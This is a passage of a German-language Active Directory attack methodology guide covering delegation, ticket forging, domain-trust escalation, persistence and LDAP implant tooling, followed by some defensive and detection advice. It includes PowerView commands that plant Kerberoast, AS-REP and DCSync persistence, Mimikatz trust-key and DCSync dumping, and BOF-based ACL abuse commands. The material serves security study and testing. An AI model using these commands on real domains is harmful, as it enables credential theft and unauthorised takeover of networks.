Wenn du ein Computer object mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und du Domain-Berechtigungen auf dem Computer hast, wirst du in der Lage sein, TGTs aus dem Speicher von jedem Benutzer zu dumpen, der sich am Computer anmeldet.\
Wenn sich also ein **Domain Admin** am Computer anmeldet, kannst du sein TGT dumpen und ihn mit [Pass the Ticket](pass-the-ticket.md) impersonate.\
Dank constrained delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich ist es ein DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn ein Benutzer oder Computer für "Constrained Delegation" erlaubt ist, kann er **jeden Benutzer impersonate, um auf bestimmte Services auf einem Computer zuzugreifen**.\
Dann, wenn du den **hash dieses Benutzers/Computers kompromittierst**, kannst du **jeden Benutzer** (sogar domain admins) impersonate, um auf bestimmte Services zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Mit **WRITE**-Rechten auf einem Active Directory object eines entfernten Computers lässt sich code execution mit **elevated privileges** erreichen:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Der kompromittierte Benutzer könnte einige **interessante Berechtigungen über einige domain objects** haben, die es dir ermöglichen könnten, lateral zu **move**/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Das Finden eines **laufenden Spool service** innerhalb der Domain kann **missbraucht** werden, um **neue credentials zu erlangen** und privileges zu **escalate**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Wenn **andere Benutzer** auf die **kompromittierte** Maschine **zugreifen**, ist es möglich, **credentials aus dem Speicher zu sammeln** und sogar **beacons in ihre Prozesse zu injizieren**, um sie zu impersonate.\
Normalerweise greifen Benutzer per RDP auf das System zu, daher findest du hier, wie man einige Angriffe auf fremde RDP-Sessions durchführt:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** stellt ein System zur Verwaltung des **lokalen Administratorpassworts** auf Domain-joined-Computern bereit und sorgt dafür, dass es **randomized**, einzigartig und häufig **changed** wird. Diese Passwörter werden in Active Directory gespeichert, und der Zugriff wird über ACLs nur für autorisierte Benutzer gesteuert. Mit ausreichenden Berechtigungen, um auf diese Passwörter zuzugreifen, wird ein Pivot zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Zertifikate vom kompromittierten Rechner zu sammeln** kann ein Weg sein, um innerhalb der Umgebung privileges zu escalaten:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Wenn **vulnerable templates** konfiguriert sind, ist es möglich, sie zu missbrauchen, um privileges zu escalaten:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sobald du **Domain Admin**- oder noch besser **Enterprise Admin**-Rechte bekommst, kannst du die **domain database** dumpen: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Einige der zuvor besprochenen Techniken können für Persistence verwendet werden.\
Zum Beispiel könntest du:

- Benutzer anfällig für [**Kerberoast**](kerberoast.md) machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer anfällig für [**ASREPRoast**](asreproast.md) machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- einem Benutzer Berechtigungen für [**DCSync**](#dcsync) gewähren

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver Ticket attack** erzeugt ein **legitimes Ticket Granting Service (TGS) ticket** für einen bestimmten Service, indem der **NTLM hash** verwendet wird (zum Beispiel der **hash des PC accounts**). Diese Methode wird verwendet, um auf die **Service privileges** zuzugreifen.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ein **Golden Ticket attack** bedeutet, dass ein Angreifer Zugriff auf den **NTLM hash des krbtgt accounts** in einer Active Directory (AD)-Umgebung erlangt. Dieses Konto ist speziell, weil es dazu verwendet wird, alle **Ticket Granting Tickets (TGTs)** zu signieren, die für die Authentifizierung innerhalb des AD-Netzwerks essenziell sind.

Sobald der Angreifer diesen hash erhält, kann er **TGTs** für jedes Konto erstellen, das er auswählt (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese sind wie golden tickets, aber so gefälscht, dass sie **gängige mechanisms zur Erkennung von golden tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Zertifikate eines Accounts zu haben oder sie anfordern zu können** ist ein sehr guter Weg, um im Benutzerkonto persistent zu bleiben (selbst wenn er das Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Mit Zertifikaten ist es auch möglich, mit hohen Rechten innerhalb der Domain persistent zu bleiben:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das Objekt **AdminSDHolder** in Active Directory stellt die Sicherheit von **privileged groups** (wie Domain Admins und Enterprise Admins) sicher, indem es eine standardmäßige **Access Control List (ACL)** auf diese Gruppen anwendet, um unautorisierte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden; wenn ein Angreifer die ACL von AdminSDHolder so ändert, dass ein normaler Benutzer Vollzugriff erhält, bekommt dieser Benutzer umfangreiche Kontrolle über alle privilegierten Gruppen. Diese Schutzmaßnahme kann also nach hinten losgehen und unberechtigten Zugriff ermöglichen, wenn sie nicht genau überwacht wird.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Innerhalb jedes **Domain Controller (DC)** existiert ein **lokaler Administrator**-Account. Wenn man Admin-Rechte auf einer solchen Maschine erlangt, kann der lokale Administrator-**hash** mit **mimikatz** extrahiert werden. Danach ist eine Registry-Änderung nötig, um **die Verwendung dieses Passworts zu aktivieren**, sodass Remote-Zugriff auf den lokalen Administrator-Account möglich wird.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** über bestimmte domain objects **einige spezielle Berechtigungen** geben, die es dem Benutzer erlauben werden, in Zukunft **privileges zu escalaten**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** werden verwendet, um die **permissions** zu **speichern**, die ein **object** über ein **object** hat. Wenn du nur eine **kleine Änderung** am **security descriptor** eines Objekts vornehmen kannst, kannst du sehr interessante privileges über dieses Objekt erhalten, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauche die Hilfsklasse `dynamicObject`, um kurzlebige Principals/GPOs/DNS records mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen; sie löschen sich selbst ohne tombstones, wodurch LDAP-Evidenz verschwindet, während verwaiste SIDs, kaputte `gPLink`-References oder gecachte DNS-Antworten zurückbleiben (z. B. AdminSDHolder ACE pollution oder schädliche `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Speicher, um ein **universelles Passwort** zu etablieren, das Zugriff auf alle domain accounts gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Erfahre hier, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst deinen **eigenen SSP** erstellen, um die für den Zugriff auf die Maschine verwendeten **credentials** im **Klartext** zu **capturen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Es registriert einen **neuen Domain Controller** in AD und nutzt ihn, um **attributes zu pushen** (SIDHistory, SPNs...) auf bestimmte Objekte, **ohne** irgendwelche **logs** bezüglich der **modifications** zu hinterlassen. Du **brauchst DA**-Rechte und musst im **root domain** sein.\
Beachte, dass bei falschen Daten ziemlich unschöne logs erscheinen werden.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Vorher haben wir darüber gesprochen, wie man privileges escalaten kann, wenn man **genug Berechtigung hat, um LAPS passwords zu lesen**. Diese passwords können jedoch auch verwendet werden, um **Persistence** aufrechtzuerhalten.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Das bedeutet, dass die **Kompromittierung einer einzelnen Domain potenziell zur Kompromittierung des gesamten Forest führen könnte**.

### Basic Information

Ein [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der es einem Benutzer aus einer **domain** ermöglicht, auf Ressourcen in einer anderen **domain** zuzugreifen. Er erstellt im Wesentlichen eine Verbindung zwischen den Authentifizierungssystemen der beiden Domains und ermöglicht so einen nahtlosen Ablauf von Authentifizierungsprüfungen. Wenn Domains einen Trust einrichten, tauschen und behalten sie bestimmte **keys** in ihren **Domain Controllers (DCs)**, die für die Integrität des Trusts entscheidend sind.

In einem typischen Szenario muss ein Benutzer, der auf einen Service in einer **trusted domain** zugreifen will, zuerst ein spezielles Ticket anfordern, das als **inter-realm TGT** vom DC seiner eigenen Domain aus bezeichnet wird. Dieses TGT wird mit einem gemeinsam genutzten **key** verschlüsselt, auf den sich beide Domains geeinigt haben. Der Benutzer legt dieses TGT dann dem **DC der trusted domain** vor, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des inter-realm TGT durch den DC der trusted domain stellt dieser ein TGS aus und gewährt dem Benutzer Zugriff auf den Service.

**Schritte**:

1. Ein **client computer** in **Domain 1** startet den Prozess, indem er mit seinem **NTLM hash** einen **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anfordert.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert dann ein **inter-realm TGT** von DC1 an, das benötigt wird, um auf Ressourcen in **Domain 2** zuzugreifen.
4. Das inter-realm TGT wird mit einem **trust key** verschlüsselt, der zwischen DC1 und DC2 im Rahmen des bidirektionalen domain trust geteilt wird.
5. Der Client bringt das inter-realm TGT zu **Domain 2's Domain Controller (DC2)**.
6. DC2 überprüft das inter-realm TGT mit seinem gemeinsam genutzten trust key und stellt, falls gültig, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich legt der Client dieses TGS dem Server vor, das mit dem Account-**hash** des Servers verschlüsselt ist, um Zugriff auf den Service in Domain 2 zu erhalten.

### Different trusts

Es ist wichtig zu beachten, dass **ein Trust einseitig oder zweiseitig sein kann**. Bei zweiseitigen Optionen vertrauen beide Domains einander, aber bei einer **einseitigen** Trust-Beziehung ist eine der Domains die **trusted** und die andere die **trusting** domain. Im letzten Fall **kannst du nur auf Ressourcen innerhalb der trusting domain von der trusted domain aus zugreifen**.

Wenn Domain A Domain B vertraut, ist A die trusting domain und B die trusted one. Außerdem wäre dies in **Domain A** ein **Outbound trust**; und in **Domain B** ein **Inbound trust**.

**Verschiedene trusting relationships**

- **Parent-Child Trusts**: Das ist ein gängiges Setup innerhalb desselben Forest, bei dem eine Child Domain automatisch einen zweiseitigen transitive Trust mit ihrer Parent Domain hat. Das bedeutet im Wesentlichen, dass Authentifizierungsanfragen nahtlos zwischen Parent und Child fließen können.
- **Cross-link Trusts**: Auch "shortcut trusts" genannt, werden diese zwischen Child Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals normalerweise bis zur Forest Root und dann wieder hinunter zur Ziel-Domain reisen. Durch Cross-links wird der Weg verkürzt, was besonders in geografisch verteilten Umgebungen vorteilhaft ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht verwandten Domains eingerichtet und sind naturgemäß nicht transitive. Laut [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind external trusts nützlich, um auf Ressourcen in einer Domain außerhalb des aktuellen Forest zuzugreifen, die nicht durch einen forest trust verbunden ist. Die Sicherheit wird durch SID filtering bei external trusts erhöht.
- **Tree-root Trusts**: Diese Trusts werden automatisch zwischen der Forest Root Domain und einer neu hinzugefügten Tree Root eingerichtet. Obwohl man ihnen nicht oft begegnet, sind tree-root trusts wichtig, um neue Domain Trees zu einem Forest hinzuzufügen, damit sie einen eindeutigen Domain-Namen behalten und eine zweiseitige Transitivität sicherstellen. Weitere Informationen finden sich in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Dieser Trust-Typ ist ein zweiseitiger transitive Trust zwischen zwei Forest Root Domains und erzwingt ebenfalls SID filtering, um die Sicherheitsmaßnahmen zu verbessern.
- **MIT Trusts**: Diese Trusts werden mit nicht-Windows-, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-Domains eingerichtet. MIT trusts sind etwas spezialisierter und richten sich an Umgebungen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems benötigen.

#### Other differences in **trusting relationships**

- Eine Trust-Beziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, dann vertraut A C) oder **nicht transitive**.
- Eine Trust-Beziehung kann als **bidirectional trust** (beide vertrauen einander) oder als **one-way trust** (nur einer vertraut dem anderen) eingerichtet werden.

### Attack Path

1. Die trusting relationships **enumerate**
2. Prüfe, ob irgendein **security principal** (user/group/computer) **Zugriff** auf Ressourcen der **anderen Domain** hat, vielleicht über ACE-Einträge oder weil er in Gruppen der anderen Domain ist. Suche nach **relationships across domains** (der Trust wurde wahrscheinlich genau dafür erstellt).
1. kerberoast könnte in diesem Fall eine weitere Option sein.
3. Die **accounts** kompromittieren, die ein **pivot** durch Domains ermöglichen.

Angreifer mit Zugang zu Ressourcen in einer anderen Domain können dies über drei primäre Mechanismen tun:

- **Local Group Membership**: Principals könnten zu lokalen Gruppen auf Maschinen hinzugefügt werden, etwa zur Gruppe “Administrators” auf einem Server, was ihnen erhebliche Kontrolle über diese Maschine verschafft.
- **Foreign Domain Group Membership**: Principals können auch Mitglieder von Gruppen innerhalb der fremden Domain sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Umfang der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals könnten in einer **ACL** angegeben sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, wodurch sie Zugriff auf bestimmte Ressourcen erhalten. Für diejenigen, die tiefer in die Mechanik von ACLs, DACLs und ACEs eintauchen möchten, ist das Whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” eine wertvolle Ressource.

### Find external users/groups with permissions

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** prüfen, um Foreign Security Principals in der Domain zu finden. Diese werden Benutzer/Gruppen aus **einer externen Domain/Forest** sein.

Du könntest dies in **Bloodhound** oder mit powerview prüfen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Privilege Escalation von Child zu Parent Forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Andere Möglichkeiten, Domain Trusts zu enumerieren:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 trusted keys**, eine für _Child --> Parent_ und eine weitere für _Parent_ --> _Child_.\
> Du kannst diejenige, die von der aktuellen domain verwendet wird, mit:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate als Enterprise admin zur child/parent domain, indem du die trust mit SID-History injection missbrauchst:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Das Verständnis, wie der Configuration Naming Context (NC) ausgenutzt werden kann, ist entscheidend. Der Configuration NC dient als zentrales Repository für Konfigurationsdaten in allen Forests in Active Directory (AD)-Umgebungen. Diese Daten werden auf jeden Domain Controller (DC) innerhalb des Forest repliziert, wobei schreibbare DCs eine schreibbare Kopie des Configuration NC vorhalten. Um dies auszunutzen, muss man **SYSTEM privileges auf einem DC** haben, vorzugsweise auf einem child DC.

**Link GPO to root DC site**

Der Sites-Container des Configuration NC enthält Informationen über die Sites aller domain-joined computers innerhalb des AD forest. Wenn man mit SYSTEM privileges auf einem beliebigen DC arbeitet, können Angreifer GPOs mit den root DC sites verknüpfen. Diese Aktion kann das root domain kompromittieren, indem die auf diese Sites angewendeten policies manipuliert werden.

Für weiterführende Informationen kann man Forschung zu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) anschauen.

**Compromise any gMSA in the forest**

Ein Angriffspfad besteht darin, privilegierte gMSAs innerhalb der domain anzugreifen. Der KDS Root key, der für die Berechnung der passwords von gMSAs erforderlich ist, wird im Configuration NC gespeichert. Mit SYSTEM privileges auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die passwords für jede gMSA im gesamten forest zu berechnen.

Detaillierte Analyse und Schritt-für-Schritt-Anleitung finden sich in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender delegierter MSA-Angriff (BadSuccessor – Missbrauch von migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Zusätzliche externe Forschung: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Diese Methode erfordert Geduld und das Warten auf die Erstellung neuer privilegierter AD objects. Mit SYSTEM privileges kann ein Angreifer das AD Schema ändern, um jedem Benutzer vollständige Kontrolle über alle classes zu geben. Dies kann zu unbefugtem Zugriff und zur Kontrolle über neu erstellte AD objects führen.

Weiterführende Informationen gibt es unter [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5 vulnerability zielt auf die Kontrolle über Public Key Infrastructure (PKI) objects ab, um eine certificate template zu erstellen, die die Authentifizierung als jeder Benutzer innerhalb des forest ermöglicht. Da sich PKI objects im Configuration NC befinden, ermöglicht das Kompromittieren eines schreibbaren child DC die Durchführung von ESC5 attacks.

Mehr dazu kann in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) nachgelesen werden. In Szenarien ohne ADCS hat der Angreifer die Möglichkeit, die notwendigen Komponenten einzurichten, wie in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario **wird deine Domain** von einer externen vertrauenswürdig gemacht, die dir **nicht näher bestimmte Berechtigungen** darüber gewährt. Du musst herausfinden, **welche Principals deiner Domain welchen Zugriff auf die externe Domain haben** und dann versuchen, dies auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario **vertraut** deine **Domäne** einem Prinzipal aus **anderen Domänen** einige **Privilegien**.

Wenn jedoch eine **Domäne** von der vertrauenden Domäne **vertraut** wird, erstellt die vertrauenswürdige Domäne einen **Benutzer** mit einem **vorhersehbaren Namen**, der das **trusted password** als **Passwort** verwendet. Das bedeutet, dass es möglich ist, auf einen Benutzer aus der vertrauenden Domäne zuzugreifen, um in die vertrauenswürdige Domäne zu gelangen, sie zu enumerieren und zu versuchen, weitere Privilegien zu eskalieren:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine andere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, ist, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in die **entgegengesetzte Richtung** der Domänenvertrauenskette erstellt wurde (was nicht sehr häufig ist).

Eine weitere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, auf einer Maschine zu warten, auf die ein **Benutzer aus der vertrauenswürdigen Domäne zugreifen kann**, um sich per **RDP** anzumelden. Dann könnte der Angreifer Code in den RDP-Session-Prozess injizieren und von dort aus auf die **Ursprungsdomäne des Opfers** zugreifen.\
Außerdem könnte der Angreifer, wenn das **Opfer seine Festplatte eingebunden hat**, vom **RDP-Session**-Prozess aus **Backdoors** im **Startup-Ordner der Festplatte** ablegen. Diese Technik heißt **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID history-Attribut über Forest Trusts hinweg ausnutzen, wird durch SID Filtering gemindert, das standardmäßig bei allen Inter-Forest Trusts aktiviert ist. Dies beruht auf der Annahme, dass Intra-Forest Trusts sicher sind, wobei der Forest statt der Domäne als Sicherheitsgrenze gilt, entsprechend Microsofts Standpunkt.
- Allerdings gibt es einen Haken: SID Filtering kann Anwendungen und Benutzerzugriff beeinträchtigen, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei Inter-Forest Trusts stellt Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domänen und Server innerhalb der vertrauenden Domäne oder des Forest zugreifen können.
- Wichtig ist, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das Trust-Konto schützen.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-ähnliche LDAP-Primitives neu als x64 Beacon Object Files, die vollständig innerhalb eines On-Host-Implants laufen (z. B. Adaptix C2). Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann `ldap <subcommand>` vom Beacon aus auf. Der gesamte Traffic läuft über den aktuellen Logon-Sicherheitskontext via LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischer Zertifikatsvertrauung, sodass keine socks proxies oder Festplatten-Artefakte erforderlich sind.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` lösen Kurzname-/OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute` und `get-domaininfo` holen beliebige Attribute (einschließlich Security Descriptors) sowie die Forest/Domäne-Metadaten aus `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` zeigen Roasting-Kandidaten, Delegationseinstellungen und vorhandene [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-Deskriptoren direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` parsen die DACL, um Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/attribute writes) und Vererbung aufzulisten, was sofortige Ziele für ACL privilege escalation liefert.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-Schreibprimitive für Eskalation & Persistenz

- Object-creation-BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) erlauben es dem Operator, neue Principals oder Machine Accounts dort zu platzieren, wo OU-Rechte existieren. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` kapern Targets direkt, sobald Write-Property-Rechte gefunden wurden.
- ACL-fokussierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` übersetzen WriteDACL/WriteOwner auf jedes AD-Objekt in Passwort-Resets, Kontrolle über Group Membership oder DCSync-Replication-Privilegien, ohne PowerShell/ADSI-Artefakte zu hinterlassen. `remove-*`-Gegenstücke bereinigen injizierte ACEs.

### Delegation, Roasting und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten User sofort Kerberoastable; `add-asreproastable` (UAC-Toggle) markiert ihn für AS-REP Roasting, ohne das Passwort anzutasten.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` direkt vom Beacon aus um, ermöglichen constrained/unconstrained/RBCD-Angriffspfade und machen Remote PowerShell oder RSAT überflüssig.

### sidHistory-Injection, OU-Verschiebung und Formung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht so stealthy Access-Inheritance vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/OU von Computern oder Benutzern und erlaubt es einem Angreifer, Assets in OUs zu ziehen, in denen delegierte Rechte bereits existieren, bevor `set-password`, `add-groupmember` oder `add-spn` missbraucht werden.
- Eng begrenzte Remove-Befehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) ermöglichen nach dem Harvesting von Credentials oder Persistenz eine schnelle Rücknahme und minimieren Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Defenses

[**Erfahre hier mehr darüber, wie du Credentials schützen kannst.**](../stealing-credentials/credentials-protections.md)

### **Defensive Maßnahmen zum Schutz von Credentials**

- **Einschränkungen für Domain Admins**: Es wird empfohlen, dass Domain Admins sich nur auf Domain Controllern anmelden dürfen, um ihre Nutzung auf anderen Hosts zu vermeiden.
- **Berechtigungen von Service Accounts**: Services sollten nicht mit Domain Admin (DA)-Privilegien ausgeführt werden, um die Sicherheit zu erhalten.
- **Temporäre Privilegienbegrenzung**: Für Aufgaben, die DA-Privilegien erfordern, sollte deren Dauer begrenzt werden. Dies kann erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP-Relay-Mitigation**: Prüfe Event IDs 2889/3074/3075 und setze dann LDAP signing plus LDAPS channel binding auf DCs/Clients durch, um LDAP MITM-/Relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level Fingerprinting von Impacket-Aktivität

Wenn du gängiges AD tradecraft erkennen willst, verlasse dich **nicht nur auf vom Operator kontrollierte Artefakte** wie umbenannte Binaries, Service-Namen, temporäre Batch-Dateien oder Output-Pfade. Erstelle eine Baseline dafür, wie legitime Windows-Clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC und WMI-Traffic aufbauen, und suche dann nach **Implementierungsbesonderheiten**, die selbst dann bestehen bleiben, wenn der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` anpasst.

- **Standalone-Kandidaten mit hoher Vertrauenswürdigkeit** (nach Validierung gegen deine eigene Baseline):
- Authenticated DCE/RPC mit `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding mit `0xff` gefüllt
- LDAP-Kerberos-Binds, die ein rohes Kerberos-`AP-REQ` direkt in `mechToken` von SPNEGO platzieren
- SMB2/3 negotiate requests mit ASCII-ähnlichen `ClientGuid`-Werten
- WMI `IWbemLevel1Login::NTLMLogin` mit dem nicht-standardisierten Namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Besser als Korrelation/Scoring-Features**:
